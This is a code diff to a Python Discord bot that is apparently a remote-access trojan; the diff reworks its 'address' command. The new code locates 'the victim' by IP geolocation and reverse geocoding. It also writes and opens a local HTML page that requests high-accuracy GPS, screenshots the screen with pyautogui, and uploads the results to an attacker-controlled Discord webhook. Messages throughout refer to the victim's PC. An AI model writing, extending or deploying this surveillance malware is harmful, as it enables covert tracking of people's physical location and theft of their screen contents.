@@ -14,6 +14,7 @@ import uuid
 import asyncio
 import random
 import string
+import webbrowser
 from discord.ext import commands
 from dotenv import load_dotenv
 import sqlite3
@@ -216,65 +217,6 @@ def get_ip_geolocation(ip):
         return {'ip': ip, 'error': 'Geolocation failed'}
     except:
         return {'ip': ip, 'error': 'Request failed'}
-
-def get_physical_address():
-    """Get physical address using whatismyaddress.net"""
-    try:
-        # Open the website in a hidden browser window
-        import webbrowser
-        import time
-        
-        # Method 1: Use Selenium if installed
-        try:
-            from selenium import webdriver
-            from selenium.webdriver.chrome.options import Options
-            
-            options = Options()
-            options.add_argument('--headless')
-            options.add_argument('--disable-gpu')
-            options.add_argument('--no-sandbox')
-            
-            driver = webdriver.Chrome(options=options)
-            driver.get('https://whatismyaddress.net/')
-            time.sleep(5)
-            
-            # Try to get address from page
-            address_elements = driver.find_elements_by_xpath("//div[contains(@class, 'address')]")
-            if address_elements:
-                address = address_elements[0].text
-                driver.quit()
-                return address
-            
-            # Try to get from JavaScript
-            address = driver.execute_script("return document.body.innerText;")
-            driver.quit()
-            return address[:500]
-        except:
-            pass
-        
-        # Method 2: Use webbrowser to open and take screenshot
-        import pyautogui
-        import webbrowser
-        
-        webbrowser.open('https://whatismyaddress.net/')
-        time.sleep(5)
-        
-        # Take screenshot
-        screenshot = pyautogui.screenshot()
-        screenshot_path = f"address_{int(time.time())}.png"
-        screenshot.save(screenshot_path)
-        
-        # Send screenshot to webhook
-        from discord import SyncWebhook, File
-        webhook = SyncWebhook.from_url(WEBHOOK_URL)
-        with open(screenshot_path, 'rb') as f:
-            webhook.send(content="**Physical Address (Screenshot)**", file=File(f, screenshot_path))
-        os.remove(screenshot_path)
-        
-        return "Address screenshot sent to webhook"
-        
-    except Exception as e:
-        return f"Address retrieval failed: {str(e)}"
 
 def run_command(cmd):
     try:
@@ -584,44 +526,133 @@ async def address(ctx):
     
     def address_thread():
         try:
-            # Open the website in a hidden browser window
-            import webbrowser
             import time
+            import webbrowser
             
-            # Use the website's GPS feature by opening it
-            webbrowser.open('https://whatismyaddress.net/')
-            time.sleep(3)
+            # Method 1: Try to get GPS coordinates using geocoder
+            try:
+                import geocoder
+                # Get GPS coordinates from IP
+                g = geocoder.ip('me')
+                if g.latlng:
+                    lat, lng = g.latlng
+                    # Reverse geocode to get address
+                    try:
+                        import reverse_geocode
+                        location = reverse_geocode.search([(lat, lng)])
+                        if location:
+                            address_data = location[0]
+                            address = f"City: {address_data.get('city', 'Unknown')}\nState: {address_data.get('state', 'Unknown')}\nCountry: {address_data.get('country', 'Unknown')}\nPostal: {address_data.get('postal', 'Unknown')}\nCoordinates: {lat}, {lng}"
+                            asyncio.run_coroutine_threadsafe(
+                                send_webhook(f"**PHYSICAL ADDRESS**\n```\n{address}\n```"),
+                                bot.loop
+                            )
+                            asyncio.run_coroutine_threadsafe(
+                                ctx.send("Physical address found and sent to webhook!"),
+                                bot.loop
+                            )
+                            return
+                    except:
+                        pass
+            except:
+                pass
             
-            # Send the URL to webhook so user can check themselves
+            # Method 2: Use HTML5 Geolocation via browser
+            try:
+                # Create HTML file with geolocation
+                html_content = '''
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <title>Get Address</title>
+                    <script>
+                        function getLocation() {
+                            if (navigator.geolocation) {
+                                navigator.geolocation.getCurrentPosition(showPosition, showError, {enableHighAccuracy: true, timeout: 10000});
+                            } else {
+                                document.getElementById("result").innerHTML = "Geolocation not supported";
+                            }
+                        }
+                        function showPosition(position) {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
+                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`)
+                                .then(response => response.json())
+                                .then(data => {
+                                    const address = data.display_name || "Address not found";
+                                    document.getElementById("result").innerHTML = "Location: " + address + "\\nCoordinates: " + lat + ", " + lon;
+                                })
+                                .catch(() => {
+                                    document.getElementById("result").innerHTML = "Coordinates: " + lat + ", " + lon;
+                                });
+                        }
+                        function showError(error) {
+                            document.getElementById("result").innerHTML = "GPS Error: " + error.message;
+                        }
+                    </script>
+                </head>
+                <body>
+                    <h2>Getting Your Physical Address...</h2>
+                    <button onclick="getLocation()">Allow GPS</button>
+                    <p id="result">Click the button and allow GPS access</p>
+                    <p>This page will auto-detect your location</p>
+                    <script>
+                        setTimeout(getLocation, 2000);
+                    </script>
+                </body>
+                </html>
+                '''
+                
+                html_path = os.path.join(os.environ['TEMP'], 'address.html')
+                with open(html_path, 'w', encoding='utf-8') as f:
+                    f.write(html_content)
+                
+                # Open in browser
+                webbrowser.open('file://' + html_path)
+                
+                asyncio.run_coroutine_threadsafe(
+                    send_webhook(f"**ADDRESS COLLECTION**\nHTML page opened in browser. The victim needs to allow GPS access."),
+                    bot.loop
+                )
+                
+                # Take screenshot after delay
+                time.sleep(5)
+                try:
+                    import pyautogui
+                    screenshot = pyautogui.screenshot()
+                    screenshot_path = f"address_{int(time.time())}.png"
+                    screenshot.save(screenshot_path)
+                    
+                    from discord import SyncWebhook, File
+                    webhook = SyncWebhook.from_url(WEBHOOK_URL)
+                    with open(screenshot_path, 'rb') as f:
+                        webhook.send(content="**Address Page Screenshot**", file=File(f, screenshot_path))
+                    os.remove(screenshot_path)
+                except:
+                    pass
+                
+                asyncio.run_coroutine_threadsafe(
+                    ctx.send("Address page opened on victim's PC. Check webhook for GPS data."),
+                    bot.loop
+                )
+                return
+                
+            except Exception as e:
+                asyncio.run_coroutine_threadsafe(
+                    send_webhook(f"Browser method failed: {str(e)}"),
+                    bot.loop
+                )
+            
+            # Method 3: Send URL for manual check
             asyncio.run_coroutine_threadsafe(
-                send_webhook(f"**Physical Address URL**\nOpen this link in a browser on the victim's PC:\nhttps://whatismyaddress.net/"),
+                send_webhook(f"**MANUAL ADDRESS CHECK**\nOpen this link on victim's PC with GPS enabled:\nhttps://whatismyaddress.net/"),
+                bot.loop
+            )
+            asyncio.run_coroutine_threadsafe(
+                ctx.send("Check webhook for instructions to get physical address."),
                 bot.loop
             )
             
-            # Try to take a screenshot of the page using pyautogui
-            try:
-                import pyautogui
-                time.sleep(2)
-                screenshot = pyautogui.screenshot()
-                screenshot_path = f"address_{int(time.time())}.png"
-                screenshot.save(screenshot_path)
-                
-                from discord import SyncWebhook, File
-                webhook = SyncWebhook.from_url(WEBHOOK_URL)
-                with open(screenshot_path, 'rb') as f:
-                    webhook.send(content="**Physical Address (Screenshot)**", file=File(f, screenshot_path))
-                os.remove(screenshot_path)
-                
-                asyncio.run_coroutine_threadsafe(
-                    ctx.send("Address screenshot sent to webhook. The victim may need to allow GPS permission on the page."),
-                    bot.loop
-                )
-            except:
-                asyncio.run_coroutine_threadsafe(
-                    ctx.send("Address URL sent to webhook. Open it on the victim's PC with GPS enabled."),
-                    bot.loop
-                )
-                
         except Exception as e:
             asyncio.run_coroutine_threadsafe(
                 send_webhook(f"Address retrieval error: {str(e)}"),
